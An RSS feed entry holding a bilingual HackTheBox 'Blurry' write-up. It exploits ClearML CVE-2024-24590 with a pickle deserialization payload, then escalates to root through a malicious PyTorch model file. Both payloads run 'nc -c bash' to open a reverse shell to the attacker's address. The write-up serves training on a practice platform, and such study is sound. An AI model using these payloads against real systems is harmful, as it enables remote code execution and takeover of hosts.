@@ -1,0 +1,287 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>CODE: Zerberus</title>
+    <description>b0rgch3n&apos;s blog</description>
+    <link>http://localhost:4000/</link>
+    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
+    <pubDate>Tue, 18 Jun 2024 13:58:07 +0800</pubDate>
+    <lastBuildDate>Tue, 18 Jun 2024 13:58:07 +0800</lastBuildDate>
+    <generator>Jekyll v4.3.2</generator>
+    
+      <item>
+        <title>「WriteUp」HackTheBox - Blurry</title>
+        <description>&lt;p&gt;Blurry is a medium-difficulty box in the fifth season of HackTheBox in 2024.&lt;/p&gt;
+
+&lt;!--
+Blurry 是 HackTheBox 在 2024 年度第 5 赛季的一个中等难度盒子。
+--&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h2&gt;
+
+&lt;p&gt;Let’s start by enumerating.&lt;/p&gt;
+
+&lt;!--
+先进行枚举。
+--&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2024-06-13-writeup-hackthebox-blurry/image-1.png&quot; alt=&quot;&quot; /&gt;
+  &lt;em&gt;Nmap scan&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;The &lt;b&gt;Nmap&lt;/b&gt; scan report shows open ports 22 and 80.&lt;br /&gt;
+Port 80 is a web service and redirects to the domain “app.blurry.htb”.&lt;br /&gt;
+So, You need to configure the hosts file first.&lt;/p&gt;
+
+&lt;p&gt;Since there is a web service, we should enumerate the directories.&lt;/p&gt;
+
+&lt;!--
+Nmap 扫描报告显示开放端口有 22、80。  
+80 端口为 Web 服务，且重定向到域名 &quot;app.blurry.htb&quot;，需要先配置一下 hosts 文件。   
+
+配置后对 Web 服务进行枚举目录。
+--&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2024-06-13-writeup-hackthebox-blurry/image-2.png&quot; alt=&quot;&quot; /&gt;
+  &lt;em&gt;dirsearch scan&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;Also, when accessing the web service through a browser,&lt;br /&gt;
+the page information indicates that the service is ClearML.&lt;/p&gt;
+
+&lt;!--
+通过浏览器访问 Web 服务，页面显示服务为 ClearML。
+--&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2024-06-13-writeup-hackthebox-blurry/image-3.png&quot; alt=&quot;&quot; /&gt;
+  &lt;em&gt;brower access&lt;/em&gt;&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;foothold&quot;&gt;Foothold&lt;/h2&gt;
+
+&lt;p&gt;Found a ClearML-related vulnerability through Google search: &lt;a href=&quot;https://github.com/LordVileOnX/ClearML-vulnerability-exploit-RCE-2024-CVE-2024-24590-/tree/main&quot;&gt;CVE-2024-24590&lt;/a&gt;.&lt;/p&gt;
+
+&lt;!--
+Google 搜到一个 ClearML 相关的漏洞：CVE-2024-24590。
+--&gt;
+
+&lt;p&gt;All information about this vulnerability points to this article, which includes a detailed demonstration of how the vulnerability can be exploited:&lt;br /&gt;
+&lt;a href=&quot;https://hiddenlayer.com/research/not-so-clear-how-mlops-solutions-can-muddy-the-waters-of-your-supply-chain/&quot;&gt;“Machine Learning Operations: What You Need to Know Now - HiddenLayer”&lt;/a&gt;&lt;/p&gt;
+
+&lt;!--
+所有关于这个漏洞的信息都指向了这篇文章，文章中包含了具体的漏洞利用参考示范。
+--&gt;
+
+&lt;p&gt;First, install ClearML.&lt;br /&gt;
+Then, go to the settings page of the web service and copy the configuration information.&lt;/p&gt;
+
+&lt;!--
+安装 clearml，然后到 Web服务的设置页面中，复制配置信息。
+--&gt;
+
+&lt;p&gt;The configuration information involves three addresses in the ClearML initialization settings: &lt;b&gt;web_server&lt;/b&gt;, &lt;b&gt;api_server&lt;/b&gt;, and &lt;b&gt;files_server&lt;/b&gt;.&lt;br /&gt;
+We need to configure the hosts file to add the DNS entries for these three domains.&lt;/p&gt;
+
+&lt;!-- 
+配置信息涉及 clearml 初始化设置中的三个地址：web_server、api_server、files_server。
+需要配置 hosts 文件，将相关的三个域名 DNS 添加进去。
+--&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2024-06-13-writeup-hackthebox-blurry/image-4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-markdown&quot; data-lang=&quot;markdown&quot;&gt;&lt;span class=&quot;p&quot;&gt;10.&lt;/span&gt;10.11.19 app.blurry.htb	# web_server
+&lt;span class=&quot;p&quot;&gt;10.&lt;/span&gt;10.11.19 api.blurry.htb	# api_server
+&lt;span class=&quot;p&quot;&gt;10.&lt;/span&gt;10.11.19 files.blurry.htb	# files_server&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Initialize the ClearML configuration with the “&lt;b&gt;clearml-init&lt;/b&gt;” command and paste the copied content.&lt;/p&gt;
+
+&lt;!--
+通过 clearml-init 命令初始化配置  clearml，并将粘贴刚刚复制的内容。
+--&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2024-06-13-writeup-hackthebox-blurry/image-5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;From observation, the account Black Swan repeats the “Review JSON Artifacts” task every so often.&lt;/p&gt;
+
+&lt;p&gt;The task’s code contains the deserialization code needed to trigger the vulnerability.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2024-06-13-writeup-hackthebox-blurry/image-6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;After a detailed code review, we can understand its logic roughly as follows:&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;Check all tasks with project_name “&lt;b&gt;Black Swan&lt;/b&gt;” and tags &lt;b&gt;[‘review’]&lt;/b&gt;.&lt;/li&gt;
+  &lt;li&gt;Iterate through these tasks and call &lt;b&gt;artifact.get()&lt;/b&gt; for deserialization.&lt;/li&gt;
+  &lt;li&gt;Destroy these tasks after the iteration.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;!--
+根据观察，账户 Black Swan 每过一段时间就会重复执行 &quot;Review JSON Artifacts&quot; 任务。
+而任务的代码里面包含了触发漏洞需要的反序列号代码。
+
+如果详细审查代码，我们可以理解代码的逻辑大致为：
+1.检查所有 project_name 为 &quot;Black Swan&quot; 且 tags 为 [&quot;review&quot;] 的任务。
+2.遍历这些任务并且以此调用 artifact.get() 进行反序列化。
+3.遍历结束后销毁这些任务。
+--&gt;
+
+&lt;p&gt;Based on the code audit results,&lt;br /&gt;
+we need to ensure consistency in the &lt;b&gt;project_name&lt;/b&gt; and &lt;b&gt;tags&lt;/b&gt; when testing with the PoC code.&lt;/p&gt;
+
+&lt;!--
+根据以上代码审计结果，我们在使用 Poc 代码进行测试需要对其进行确保 project_name 以及 tags 的一致。
+--&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;clearml&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Task&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pickle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;RunCommand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;__reduce__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+        &lt;span class=&quot;c1&quot;&gt;# Payload
+&lt;/span&gt;        &lt;span class=&quot;nf&quot;&gt;return &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;echo Hacked by b0rg | nc 10.10.14.19 14443&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,))&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;RunCommand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;project_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Black Swan&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;task_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;TestNotMatchTaskName&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;tags&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;review&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;task&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;init&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;project_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;task_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;upload_artifact&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;pickle_artifact&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;artifact_object&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;retries&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wait_on_upload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;extension_name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;.pkl&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Use &lt;b&gt;nc&lt;/b&gt; to listen and execute the PoC code.&lt;/p&gt;
+
+&lt;p&gt;After waiting for Black Swan to repeat the “Review JSON Artifacts” task, we will see message echoing in the terminal.&lt;/p&gt;
+
+&lt;!--
+通过 nc 监听，并执行 Poc 代码。
+等待 Black Swan 再次重复执行 &quot;Review JSON Artifacts&quot; 任务后，我们能看到终端出现了消息回显。
+--&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2024-06-13-writeup-hackthebox-blurry/image-7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Modify the &lt;b&gt;Payload&lt;/b&gt; to turn the PoC code into Exploit code.&lt;/p&gt;
+
+&lt;!--
+修改 Payload 使 Poc 代码成为 Exploit 代码。
+--&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;nc &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; bash 10.10.14.19 14443&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Again, listen using &lt;b&gt;nc&lt;/b&gt;, and execute the exploit code to gain user permissions and obtain a reverse shell.&lt;/p&gt;
+
+&lt;!--
+再次通过 nc 监听，并执行 Exp 代码，获得用户权限反向 Shell。
+--&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2024-06-13-writeup-hackthebox-blurry/image-8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;!--
+--&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h2&gt;
+
+&lt;p&gt;Use &lt;b&gt;linpeas.sh&lt;/b&gt; for enumeration and collect information related to privilege escalation.&lt;/p&gt;
+
+&lt;p&gt;The scan results show that the current user has an &lt;b&gt;SSH private key&lt;/b&gt;, which can be used for persistent access.&lt;/p&gt;
+
+&lt;!--
+使用 linpeas.sh 进行枚举，收集权限提升相关信息。
+扫描结果显示当前用户存在 SSH 私钥，可用于持久化访问。
+--&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2024-06-13-writeup-hackthebox-blurry/image-9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Another interesting piece of information is that the current user has &lt;b&gt;NOPASSWD sudo&lt;/b&gt; access.&lt;/p&gt;
+
+&lt;!--
+另一个有趣的信息是，当前用户存在 NOPASSWD 的 SUDO。
+--&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2024-06-13-writeup-hackthebox-blurry/image-10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Let’s take a look at the source code of &lt;b&gt;evaluate_model&lt;/b&gt;,&lt;br /&gt;
+we can see that &lt;b&gt;evaluate_model&lt;/b&gt; actually calls the “&lt;b&gt;/models/evaluate_model.py&lt;/b&gt;” file.&lt;/p&gt;
+
+&lt;!--
+查看看 evaluate_model 的源码能发现 实际上调用了 &quot;/models/evaluate_model.py&quot; 文件。
+--&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2024-06-13-writeup-hackthebox-blurry/image-11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Looking at the source code of &lt;b&gt;evaluate_model.py&lt;/b&gt;,&lt;br /&gt;
+we can see that there is a step for loading the model,&lt;br /&gt;
+which leads us to anticipate the presence of a &lt;b&gt;deserialization&lt;/b&gt; vulnerability.&lt;/p&gt;
+
+&lt;!--
+查看 evaluate_model.py 源码，其中存在模型加载的步骤，我们大致能够预判也是存在反序列化漏洞。
+--&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2024-06-13-writeup-hackthebox-blurry/image-12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;By constructing malicious model code,&lt;br /&gt;
+we can generate a custom pth file containing a reverse shell.&lt;/p&gt;
+
+&lt;!--
+通过构造恶意的模型代码，我们能够生成包含反向 Shell 的自定义 pth 文件。
+--&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;torch&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;torch.nn&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nn&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;torch.nn.functional&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;F&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Net&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Module&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;__init__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+        &lt;span class=&quot;nf&quot;&gt;super&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Net&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;__init__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;layer1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Linear&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;128&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;layer2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Linear&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;128&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;128&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;layer3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Linear&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;128&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;forward&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;F&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;relu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;layer1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;F&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;relu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;layer2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;action&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;layer3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;action&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;__reduce__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+        &lt;span class=&quot;nf&quot;&gt;return &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;nc -c bash 10.10.14.19 14443&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,))&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;__main__&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Net&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;torch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;save&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;getshell.pth&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Upload this code to the machine and execute it to generate the &lt;b&gt;getshell.pth&lt;/b&gt; file.&lt;br /&gt;
+Then, listen using &lt;b&gt;nc&lt;/b&gt;, and execute the &lt;b&gt;NOPASSWD sudo&lt;/b&gt; exploit.&lt;/p&gt;
+
+&lt;!--
+上传该代码到机器上，执行生成 getshell.pth 文件。
+通过 nc 监听，然后执行  NOPASSWD SUDO 利用。
+--&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2024-06-13-writeup-hackthebox-blurry/image-13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Gain administrator privileges。&lt;/p&gt;
+
+&lt;!--
+获得管理员权限。
+--&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2024-06-13-writeup-hackthebox-blurry/image-14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nice!&lt;/p&gt;
+</description>
+        <pubDate>Thu, 13 Jun 2024 16:01:35 +0800</pubDate>
+        <link>http://localhost:4000/2024/06/13/writeup-hackthebox-blurry/</link>
+        <guid isPermaLink="true">http://localhost:4000/2024/06/13/writeup-hackthebox-blurry/</guid>
+        
+        <category>writeup</category>
+        
+        <category>hackthebox</category>
+        
+        
+      </item>
+    
+  </channel>
+</rss>
